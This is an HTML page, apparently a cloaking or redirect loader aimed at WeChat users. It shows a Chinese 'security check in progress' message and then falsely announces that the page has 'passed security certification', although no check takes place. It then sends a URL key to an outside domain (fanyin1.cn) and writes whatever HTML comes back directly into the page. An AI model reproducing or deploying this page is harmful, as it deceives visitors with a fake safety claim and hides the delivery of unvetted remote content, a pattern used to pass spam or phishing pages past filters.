<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>安全页面-放心访问</title>
    <style>
        #msg {
            text-align: center;
            font-size: 18px;
            margin-top: 50px;
        }
    </style>
</head>
<body>
    <div id="msg">请稍候，当前页面检测中..</div>
    <script src="//staticssl.kugou.com/public/root/javascripts/jslib/jquery.js"></script>
    <script src="http://res.wx.qq.com/open/js/jweixin-1.2.0.js"></script>
    <script>
        var siteurl = 'https://1.fanyin1.cn/';
        var $_GET = {};
        document.location.search.replace(/\??(?:([^=]+)=([^&]*)&?)/g, function () {
            function decode(s) {
                return decodeURIComponent(s.split('+').join(' '));
            }
            $_GET[decode(arguments[1])] = decode(arguments[2]);
        });

        $(function () {
            var key = $_GET['ru20'];
            // 第一步：1秒后显示“检测完毕，已通过安全认证”
            setTimeout(function () {
                $('#msg').html('检测完毕，已通过安全认证，正在进入中..');
                // 第二步：再过1秒后执行跳转逻辑
                setTimeout(function () {
                    $.post(siteurl + 'api/find', {
                        key
                    }, function (result) {
                        if (result.code == 200) {
                            document.write(result.data.html);
                        } else {
                            $('#msg').html(result.msg);
                        }
                    }, 'json');
                }, 1000); // 再延迟1秒
            }, 1000); // 延迟1秒
        });
    </script>
</body>
</html>
